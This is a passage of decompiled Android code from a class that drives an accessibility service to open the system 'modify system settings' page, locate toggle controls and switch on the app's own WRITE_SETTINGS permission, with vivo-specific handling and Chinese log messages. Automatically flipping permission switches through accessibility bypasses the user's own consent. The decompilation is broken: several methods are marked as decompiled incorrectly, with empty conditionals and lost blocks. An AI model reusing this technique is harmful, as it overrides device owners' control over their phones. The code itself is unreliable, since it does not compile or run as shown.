                                            Boolean boolM214689a7112 = t60.m214689a7(true);
                                            m211711f4(accessibilityNodeInfo12);
                                            AbstractC0780a0.m213692a3(c0327b211.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b211, null), 3);
                                            return boolM214689a7112;
                                        case oe0.DEFAULT_M /* 11 */:
                                            AccessibilityNodeInfo accessibilityNodeInfo48 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b236 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo15 = accessibilityNodeInfo48;
                                            c0327b212 = c0327b236;
                                            c0327b212.m211738e3();
                                            Boolean boolM214689a7132 = t60.m214689a7(true);
                                            m211711f4(accessibilityNodeInfo15);
                                            AbstractC0780a0.m213692a3(c0327b212.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b212, null), 3);
                                            return boolM214689a7132;
                                        case FileClientSessionCache.MAX_SIZE /* 12 */:
                                            AccessibilityNodeInfo accessibilityNodeInfo49 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52940a2;
                                            AccessibilityNodeInfo accessibilityNodeInfo50 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b237 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            objM211747f24 = objM211715a4;
                                            accessibilityNodeInfo = accessibilityNodeInfo49;
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            c0327b214 = c0327b237;
                                            str = "x";
                                            accessibilityNodeInfo17 = accessibilityNodeInfo50;
                                            if (((Boolean) objM211747f24).booleanValue()) {
                                            }
                                            break;
                                        case 13:
                                            AccessibilityNodeInfo accessibilityNodeInfo51 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52940a2;
                                            AccessibilityNodeInfo accessibilityNodeInfo52 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b238 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo = accessibilityNodeInfo51;
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            c0327b23 = c0327b238;
                                            str = "x";
                                            accessibilityNodeInfo8 = accessibilityNodeInfo52;
                                            AccessibilityNodeInfo rootInActiveWindow32 = c0327b23.f53166a0.getRootInActiveWindow();
                                            if (rootInActiveWindow32 == null) {
                                            }
                                            if (accessibilityNodeInfoM211700c22 == null) {
                                            }
                                            m211711f4(rootInActiveWindow32);
                                            if (!zIsChecked3) {
                                            }
                                            break;
                                        case 14:
                                            AccessibilityNodeInfo accessibilityNodeInfo53 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b239 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo18 = accessibilityNodeInfo53;
                                            c0327b215 = c0327b239;
                                            c0327b215.m211738e3();
                                            Boolean boolM214689a7152 = t60.m214689a7(true);
                                            m211711f4(accessibilityNodeInfo18);
                                            AbstractC0780a0.m213692a3(c0327b215.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b215, null), 3);
                                            return boolM214689a7152;
                                        case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                                            AccessibilityNodeInfo accessibilityNodeInfo54 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b240 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            c0327b218 = c0327b240;
                                            accessibilityNodeInfo21 = accessibilityNodeInfo54;
                                            c0327b216 = c0327b218;
                                            accessibilityNodeInfo19 = accessibilityNodeInfo21;
                                            if (((Boolean) objM211715a4).booleanValue()) {
                                            }
                                            z3 = false;
                                            c0327b217 = c0327b216;
                                            accessibilityNodeInfo20 = accessibilityNodeInfo19;
                                            if (!z3) {
                                            }
                                            break;
                                        case 16:
                                            AccessibilityNodeInfo accessibilityNodeInfo55 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b241 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            c0327b220 = c0327b241;
                                            accessibilityNodeInfo23 = accessibilityNodeInfo55;
                                            AccessibilityNodeInfo rootInActiveWindow42 = c0327b220.f53166a0.getRootInActiveWindow();
                                            if (rootInActiveWindow42 == null) {
                                            }
                                            if (accessibilityNodeInfoM211700c25 == null) {
                                            }
                                            m211711f4(rootInActiveWindow42);
                                            if (!zIsChecked4) {
                                            }
                                            break;
                                        case 17:
                                            AccessibilityNodeInfo accessibilityNodeInfo56 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b242 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo24 = accessibilityNodeInfo56;
                                            c0327b221 = c0327b242;
                                            c0327b221.m211738e3();
                                            Boolean boolM214689a721 = t60.m214689a7(true);
                                            m211711f4(accessibilityNodeInfo24);
                                            AbstractC0780a0.m213692a3(c0327b221.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b221, null), 3);
                                            return boolM214689a721;
                                        case 18:
                                            AccessibilityNodeInfo accessibilityNodeInfo57 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b243 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            c0327b223 = c0327b243;
                                            accessibilityNodeInfo26 = accessibilityNodeInfo57;
                                            if (((Boolean) objM211715a4).booleanValue()) {
                                            }
                                            break;
                                        case Base64.Encoder.LINE_GROUPS /* 19 */:
                                            AccessibilityNodeInfo accessibilityNodeInfo58 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b244 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo27 = accessibilityNodeInfo58;
                                            c0327b224 = c0327b244;
                                            c0327b224.m211738e3();
                                            Boolean boolM214689a7202 = t60.m214689a7(true);
                                            m211711f4(accessibilityNodeInfo27);
                                            AbstractC0780a0.m213692a3(c0327b224.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b224, null), 3);
                                            return boolM214689a7202;
                                        default:
                                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                                    }
                                } catch (Exception e6) {
                                    e = e6;
                                }
                            } catch (Throwable th6) {
                                th = th6;
                            }
                        } catch (Exception e7) {
                            e = e7;
                            rootInActiveWindow2 = obj4;
                        } catch (Throwable th7) {
                            th = th7;
                            rootInActiveWindow2 = obj3;
                        }
                    } catch (Exception e8) {
                        e = e8;
                        rootInActiveWindow2 = "║ 品牌: ";
                        t60.m214705c6("WriteSettingsPerm", "❌ vivo右侧开关方案异常", e);
                        Boolean boolM214689a7122222 = t60.m214689a7(false);
                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                        m211711f4(rootInActiveWindow2);
                        AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                        return boolM214689a7122222;
                    } catch (Throwable th8) {
                        th = th8;
                        rootInActiveWindow2 = "║ 品牌: ";
                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                        m211711f4(rootInActiveWindow2);
                        AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                        throw th;
                    }
                } catch (Exception e9) {
                    e = e9;
                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = rootInActiveWindow2;
                    rootInActiveWindow2 = "║ 品牌: ";
                    t60.m214705c6("WriteSettingsPerm", "❌ vivo右侧开关方案异常", e);
                    Boolean boolM214689a71222222 = t60.m214689a7(false);
                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                    m211711f4(rootInActiveWindow2);
                    AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                    return boolM214689a71222222;
                } catch (Throwable th9) {
                    th = th9;
                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = rootInActiveWindow2;
                    rootInActiveWindow2 = "║ 品牌: ";
                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                    m211711f4(rootInActiveWindow2);
                    AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                    throw th;
                }
            } catch (Exception e10) {
                e = e10;
                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = obj2;
            } catch (Throwable th10) {
                th = th10;
                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = obj;
            }
        } catch (Exception e11) {
            e = e11;
            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = ", 当前状态=";
        } catch (Throwable th11) {
            th = th11;
            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = ", 当前状态=";
        }
    }

    /* renamed from: a8 */
    public final boolean m211719a8(String str, String str2) {
        try {
            if (!t60.m214686a2(str, str2)) {
                if (!t60.m214686a2(str2, this.f53167a1.getPackageName())) {
                    return true;
                }
                t60.m214726f4("WriteSettingsPerm", "⚠️ 特别检测：应用返回主应用");
                return true;
            }
            if (t60.m214686a2(str, str2) && m211708e0(str2)) {
                boolean zM211736d7 = m211736d7();
                t60.m214714d6("WriteSettingsPerm", "🔍 同包名页面检查: 是否为正确的WRITE_SETTINGS页面=" + zM211736d7);
                if (!zM211736d7) {
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 检测到同应用内页面跳转：不是WRITE_SETTINGS权限页面");
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 检查页面变化失败", e);
            return false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:34:0x008b  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x008e  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x00b1  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00b8  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x00bb  */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0014  */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211720b2(ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$ensureOnWriteSettingsPage$1 writeSettingsPermissionManager$ensureOnWriteSettingsPage$1;
        C0327b2 c0327b2;
        C0327b2 c0327b22;
        if (continuationImpl instanceof WriteSettingsPermissionManager$ensureOnWriteSettingsPage$1) {
            writeSettingsPermissionManager$ensureOnWriteSettingsPage$1 = (WriteSettingsPermissionManager$ensureOnWriteSettingsPage$1) continuationImpl;
            int i = writeSettingsPermissionManager$ensureOnWriteSettingsPage$1.f52965a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$ensureOnWriteSettingsPage$1.f52965a3 = i - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$ensureOnWriteSettingsPage$1 = new WriteSettingsPermissionManager$ensureOnWriteSettingsPage$1(this, continuationImpl);
            }
        }
        WriteSettingsPermissionManager$ensureOnWriteSettingsPage$1 writeSettingsPermissionManager$ensureOnWriteSettingsPage$12 = writeSettingsPermissionManager$ensureOnWriteSettingsPage$1;
        Object obj = writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52963a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52965a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            if (m211737d9()) {
                return Boolean.TRUE;
            }
            t60.m214726f4("WriteSettingsPerm", "⚠️ [页面验证] 不在修改系统设置页面，尝试返回");
            this.f53166a0.performGlobalAction(1);
            writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0 = this;
            writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52965a3 = 1;
            if (b81.m210571b1(300L, writeSettingsPermissionManager$ensureOnWriteSettingsPage$12) != coroutineSingletons) {
                c0327b2 = this;
            }
            return coroutineSingletons;
        }
        if (i2 != 1) {
            if (i2 == 2) {
                c0327b2 = writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0;
                kg1.m213544f4(obj);
                if (!c0327b2.m211737d9()) {
                    return Boolean.TRUE;
                }
                t60.m214726f4("WriteSettingsPerm", "⚠️ [页面验证] 返回后仍不在页面，重新打开");
                c0327b2.m211743e8();
                writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0 = c0327b2;
                writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52965a3 = 3;
                if (b81.m210571b1(300L, writeSettingsPermissionManager$ensureOnWriteSettingsPage$12) != coroutineSingletons) {
                    writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0 = c0327b2;
                    writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52965a3 = 4;
                    if (c0327b2.m211754g1(3, 200L, 3000L, writeSettingsPermissionManager$ensureOnWriteSettingsPage$12) != coroutineSingletons) {
                    }
                }
                return coroutineSingletons;
            }
            if (i2 != 3) {
                if (i2 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                c0327b22 = writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0;
                kg1.m213544f4(obj);
                if (!c0327b22.m211737d9()) {
                    return Boolean.TRUE;
                }
                t60.m214704c5("WriteSettingsPerm", "❌ [页面验证] 3次尝试后仍无法进入页面");
                return Boolean.FALSE;
            }
            c0327b2 = writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0;
            kg1.m213544f4(obj);
            writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0 = c0327b2;
            writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52965a3 = 4;
            if (c0327b2.m211754g1(3, 200L, 3000L, writeSettingsPermissionManager$ensureOnWriteSettingsPage$12) != coroutineSingletons) {
                c0327b22 = c0327b2;
                if (!c0327b22.m211737d9()) {
                }
            }
            return coroutineSingletons;
        }
        c0327b2 = writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0;
        kg1.m213544f4(obj);
        writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52962a0 = c0327b2;
        writeSettingsPermissionManager$ensureOnWriteSettingsPage$12.f52965a3 = 2;
        if (c0327b2.m211754g1(3, 200L, 3000L, writeSettingsPermissionManager$ensureOnWriteSettingsPage$12) != coroutineSingletons) {
            if (!c0327b2.m211737d9()) {
            }
        }
        return coroutineSingletons;
    }

    /* renamed from: b3 */
    public final void m211721b3(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        if (i > 15) {
            return;
        }
        try {
            if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isVisibleToUser()) {
                arrayList.add(accessibilityNodeInfo);
                this.f53181b5.add(accessibilityNodeInfo);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    m211721b3(i + 1, child, arrayList);
                    if (!arrayList.contains(child)) {
                        m211711f4(child);
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: b5 */
    public final void m211722b5(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        if (i > 20) {
            return;
        }
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            List listM213306g5 = AbstractC0716jf.m213306g5("Switch", "Toggle", "CheckBox", "RadioButton", "ToggleButton", "CompoundButton");
            if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                Iterator it = listM213306g5.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                        if (accessibilityNodeInfo.isVisibleToUser()) {
                            Rect rect = new Rect();
                            accessibilityNodeInfo.getBoundsInScreen(rect);
                            arrayList.add(accessibilityNodeInfo);
                            this.f53181b5.add(accessibilityNodeInfo);
                            t60.m214702c3("WriteSettingsPerm", "🔍 找到开关控件: 类='" + string + "', 可点击=" + accessibilityNodeInfo.isClickable() + ", 可选择=" + accessibilityNodeInfo.isCheckable() + ", 位置=" + rect + ", 文本='" + ((Object) accessibilityNodeInfo.getText()) + "', 描述='" + ((Object) accessibilityNodeInfo.getContentDescription()) + "'");
                        }
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    m211722b5(i + 1, child, arrayList);
                    if (!arrayList.contains(child)) {
                        m211711f4(child);
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: b6 */
    public final void m211723b6(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        if (i > 20) {
            return;
        }
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            List listM213306g5 = AbstractC0716jf.m213306g5("Switch", "Toggle", "CheckBox", "RadioButton", "CompoundButton", "ToggleButton", "SwitchCompat");
            if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                Iterator it = listM213306g5.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                        if (accessibilityNodeInfo.isVisibleToUser() && (accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isCheckable())) {
                            arrayList.add(accessibilityNodeInfo);
                            this.f53181b5.add(accessibilityNodeInfo);
                        }
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    m211723b6(i + 1, child, arrayList);
                    if (!arrayList.contains(child)) {
                        m211711f4(child);
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: b8 */
    public final AccessibilityNodeInfo m211724b8(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        boolean z;
        int iHeight;
        String string2;
        ArrayList arrayList = new ArrayList();
        int i = 0;
        m211721b3(0, accessibilityNodeInfo, arrayList);
        if (arrayList.isEmpty()) {
            return null;
        }
        ArrayList arrayList2 = new ArrayList();
        int size = arrayList.size();
        int i2 = 0;
        while (i2 < size) {
            Object obj = arrayList.get(i2);
            i2++;
            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
            try {
                Rect rect = new Rect();
                accessibilityNodeInfo2.getBoundsInScreen(rect);
                CharSequence text = accessibilityNodeInfo2.getText();
                String str = "";
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence className = accessibilityNodeInfo2.getClassName();
                if (className != null && (string2 = className.toString()) != null) {
                    str = string2;
                }
                int iWidth = rect.width();
                boolean z2 = true;
                boolean z3 = 50 <= iWidth && iWidth < 301 && 30 <= (iHeight = rect.height()) && iHeight < 151;
                ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55751a1, dh0.f55750a0);
                if (arrayListM213298i5.isEmpty()) {
                    z = false;
                    if (!AbstractC0779a1.m213652a5(str, "Switch", true) && !AbstractC0779a1.m213652a5(str, "Toggle", true)) {
                        z2 = false;
                    }
                    if (!z3 || z || z2) {
                        arrayList2.add(obj);
                    }
                } else {
                    int size2 = arrayListM213298i5.size();
                    int i3 = 0;
                    while (i3 < size2) {
                        Object obj2 = arrayListM213298i5.get(i3);
                        i3++;
                        if (AbstractC0779a1.m213652a5(string, (String) obj2, true)) {
                            z = true;
                            break;
                        }
                    }
                    z = false;
                    if (!AbstractC0779a1.m213652a5(str, "Switch", true)) {
                        z2 = false;
                    }
                    if (!z3) {
                    }
                    arrayList2.add(obj);
                }
            } catch (Exception unused) {
            }
        }
        AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(arrayList2);
        if (accessibilityNodeInfo3 == null) {
            accessibilityNodeInfo3 = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(arrayList);
        }
        if (accessibilityNodeInfo3 != null) {
            ArrayList arrayList3 = new ArrayList();
            int size3 = arrayList.size();
            int i4 = 0;
            while (i4 < size3) {
                Object obj3 = arrayList.get(i4);
                i4++;
                if (!t60.m214686a2((AccessibilityNodeInfo) obj3, accessibilityNodeInfo3)) {
                    arrayList3.add(obj3);
                }
            }
            int size4 = arrayList3.size();
            while (i < size4) {
                Object obj4 = arrayList3.get(i);
                i++;
                m211711f4((AccessibilityNodeInfo) obj4);
            }
        } else {
            int size5 = arrayList.size();
            while (i < size5) {
                Object obj5 = arrayList.get(i);
                i++;
                m211711f4((AccessibilityNodeInfo) obj5);
            }
        }
        return accessibilityNodeInfo3;
    }

    /* JADX WARN: Code restructure failed: missing block: B:47:0x0095, code lost:
    
        if (r5.isVisibleToUser() == false) goto L49;
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x0097, code lost:
    
        r0.add(r5);
     */
    /* renamed from: b9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m211725b9(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo parent;
        AccessibilityNodeInfo child;
        AccessibilityNodeInfo parent2;
        String string;
        ConcurrentHashMap.KeySetView keySetView = this.f53181b5;
        try {
            parent = accessibilityNodeInfo.getParent();
            int i = 0;
            while (parent != null && i < 4) {
                if (parent.isClickable() && parent.isVisibleToUser()) {
                    keySetView.add(parent);
                    break;
                }
                AccessibilityNodeInfo parent3 = parent.getParent();
                if (i > 0) {
                    m211711f4(parent);
                }
                i++;
                parent = parent3;
            }
            if (parent != null && i > 0) {
                m211711f4(parent);
            }
        } catch (Exception unused) {
        }
        parent = null;
        if (parent != null) {
            return parent;
        }
        try {
            parent2 = accessibilityNodeInfo.getParent();
        } catch (Exception unused2) {
        }
        if (parent2 == null) {
            child = null;
        } else {
            keySetView.add(parent2);
            int childCount = parent2.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                child = parent2.getChild(i2);
                if (child != null && !child.equals(accessibilityNodeInfo)) {
                    CharSequence className = child.getClassName();
                    if (className == null || (string = className.toString()) == null) {
                        string = "";
                    }
                    List listM213306g5 = AbstractC0716jf.m213306g5("Switch", "Toggle", "CheckBox", "RadioButton");
                    if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                        Iterator it = listM213306g5.iterator();
                        while (true) {
                            if (!it.hasNext()) {
                                break;
                            }
                            if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                                break;
                            }
                        }
                    }
                    m211711f4(child);
                }
            }
            child = null;
        }
        if (child != null) {
            return child;
        }
        return null;
    }

    /* JADX WARN: Removed duplicated region for block: B:64:0x00d1 A[Catch: Exception -> 0x00b1, TryCatch #1 {Exception -> 0x00b1, blocks: (B:71:0x010f, B:73:0x0115, B:75:0x011b, B:77:0x0123, B:79:0x0127, B:42:0x008c, B:44:0x0097, B:46:0x00a6, B:53:0x00b5, B:55:0x00bd, B:62:0x00cb, B:64:0x00d1, B:66:0x00d7, B:69:0x00de), top: B:86:0x008c }] */
    /* JADX WARN: Removed duplicated region for block: B:66:0x00d7 A[Catch: Exception -> 0x00b1, TryCatch #1 {Exception -> 0x00b1, blocks: (B:71:0x010f, B:73:0x0115, B:75:0x011b, B:77:0x0123, B:79:0x0127, B:42:0x008c, B:44:0x0097, B:46:0x00a6, B:53:0x00b5, B:55:0x00bd, B:62:0x00cb, B:64:0x00d1, B:66:0x00d7, B:69:0x00de), top: B:86:0x008c }] */
    /* renamed from: c0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m211726c0(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        AccessibilityNodeInfo accessibilityNodeInfo2;
        String string;
        String string2;
        boolean z;
        String string3;
        String string4;
        String string5;
        Context context = this.f53167a1;
        int i2 = 15;
        if (i > 15) {
            return null;
        }
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string5 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string5).toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string4 = contentDescription.toString()) == null || (string2 = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                string2 = "";
            }
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null && (string3 = className.toString()) != null) {
                str = string3;
            }
            if (arrayList.isEmpty()) {
                accessibilityNodeInfo2 = null;
            } else {
                int size = arrayList.size();
                int i3 = 0;
                while (i3 < size) {
                    Object obj = arrayList.get(i3);
                    i3++;
                    String str2 = (String) obj;
                    if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(string2, str2, true)) {
                        String string6 = context.getString(R$string.app_name);
                        accessibilityNodeInfo2 = null;
                        try {
                            t60.m214694b5(string6, "context.getString(R.string.app_name)");
                            if (!AbstractC0779a1.m213652a5(string, string6, true)) {
                                String packageName = context.getPackageName();
                                t60.m214694b5(packageName, "context.packageName");
                                if (!AbstractC0779a1.m213652a5(string, packageName, true) && string.length() <= 20) {
                                    z = false;
                                }
                                boolean z2 = !AbstractC0779a1.m213652a5(str, "TextView", false) && string.length() > i2;
                                if (!z && !z2) {
                                    if (!accessibilityNodeInfo.isClickable()) {
                                        this.f53181b5.add(accessibilityNodeInfo);
                                        return accessibilityNodeInfo;
                                    }
                                    AccessibilityNodeInfo accessibilityNodeInfoM211725b9 = m211725b9(accessibilityNodeInfo);
                                    if (accessibilityNodeInfoM211725b9 != null) {
                                        return accessibilityNodeInfoM211725b9;
                                    }
                                }
                                t60.m214702c3("WriteSettingsPerm", "🚫 排除误匹配: 文本='" + string + "'(长度=" + string.length() + "), 类='" + str + "'");
                            }
                            z = true;
                            if (AbstractC0779a1.m213652a5(str, "TextView", false)) {
                            }
                            if (!z) {
                                if (!accessibilityNodeInfo.isClickable()) {
                                }
                            }
                            t60.m214702c3("WriteSettingsPerm", "🚫 排除误匹配: 文本='" + string + "'(长度=" + string.length() + "), 类='" + str + "'");
                        } catch (Exception e) {
                            e = e;
                            t60.m214705c6("WriteSettingsPerm", "❌ 查找文本节点失败", e);
                            return accessibilityNodeInfo2;
                        }
                    }
                    i2 = 15;
                }
                accessibilityNodeInfo2 = null;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i4 = 0; i4 < childCount; i4++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i4);
                if (child != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoM211726c0 = m211726c0(i + 1, child, arrayList);
                    if (accessibilityNodeInfoM211726c0 != null) {
                        m211711f4(child);
                        return accessibilityNodeInfoM211726c0;
                    }
                    m211711f4(child);
                }
            }
            return accessibilityNodeInfo2;
        } catch (Exception e2) {
            e = e2;
            accessibilityNodeInfo2 = null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:104:0x0175 A[LOOP:11: B:103:0x0173->B:104:0x0175, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:21:0x005a  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x015b  */
    /* renamed from: c1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m211727c1(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM211731c9;
        AccessibilityNodeInfo accessibilityNodeInfoM211701c4;
        AccessibilityNodeInfo accessibilityNodeInfoM211730c6;
        Object next;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        char c;
